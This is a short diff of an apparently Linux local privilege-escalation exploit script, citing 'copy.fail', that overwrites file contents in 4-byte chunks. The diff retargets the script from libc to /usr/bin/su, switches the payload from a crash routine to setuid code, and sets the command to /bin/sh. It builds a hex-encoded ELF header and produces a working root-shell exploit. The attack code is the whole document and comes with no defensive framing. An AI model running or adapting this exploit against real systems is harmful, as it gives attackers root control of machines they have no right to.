@@ -10,7 +10,7 @@ https://copy.fail/#exploit
 
 PYTHON = sys.executable
 PAYLOAD = ""
-TARGET = "/usr/lib/x86_64-linux-gnu/libc.so.6"
+TARGET = "/usr/bin/su"
 
 def decode(x):
     return bytes.fromhex(x)
@@ -79,11 +79,11 @@ def make_crash_code() -> bytes:
 def make_payload(command: str):
     elf = decode("7f454c4602010100000000000000000002003e00010000007800400000000000400000000000000000000000000000000000000040003800010000000000000001000000050000000000000000000000000040000000000000004000000000009e000000000000009e000000000000000010000000000000")
     
-    # prog = make_setuid_code(command)
-    prog = make_crash_code()
+    prog = make_setuid_code(command)
+    # prog = make_crash_code()
     return elf + prog
 
-payload = make_payload("/home/aidan/payload.py")
+payload = make_payload("/bin/sh")
 
 while i<len(payload):
     c(f, i, payload[i:i+4])
